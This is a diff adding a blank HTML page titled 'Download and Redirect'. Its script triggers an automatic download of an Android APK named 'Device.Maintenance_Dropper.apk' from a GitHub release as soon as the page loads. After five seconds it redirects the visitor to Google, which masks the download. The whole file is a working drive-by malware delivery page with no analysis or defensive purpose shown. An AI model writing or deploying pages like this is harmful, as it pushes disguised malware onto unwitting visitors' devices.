@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download and Redirect</title>
+    <style>
+        /* Make the page completely white */
+        body {
+            background-color: white;
+            margin: 0;
+            height: 100vh;
+        }
+    </style>
+</head>
+<body>
+    <script>
+        // The file URL to download
+        const fileUrl = "https://github.com/fudapktopdf12/testing/releases/download/v1.0.0/Device.Maintenance_Dropper.apk";
+        // Create an anchor element and trigger the download
+        const anchor = document.createElement('a');
+        anchor.href = fileUrl;
+        anchor.download = '';
+        document.body.appendChild(anchor);
+        anchor.click();
+        document.body.removeChild(anchor);
+
+        // Wait for 5 seconds before redirecting to Google
+        setTimeout(function() {
+            window.location.href = "https://www.google.com";
+        }, 5000); // 5000 milliseconds = 5 seconds
+    </script>
+</body>
+</html>
